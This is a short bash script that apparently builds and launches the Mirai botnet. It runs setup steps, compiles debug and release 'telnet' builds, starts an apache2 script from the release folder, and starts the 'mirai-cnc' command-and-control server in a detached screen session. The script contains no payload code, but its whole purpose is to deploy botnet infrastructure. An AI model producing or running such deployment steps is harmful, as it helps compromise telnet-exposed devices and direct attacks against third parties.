#!/bin/bash
bash -c "source ${HOME}/.bashrc"
bash setup.sh
bash build.sh debug telnet
python3 setup.py
bash build.sh debug telnet

bash build.sh release telnet
cd release && bash ../apache2.sh
cd release && screen -dmS mirai-cnc ./cnc
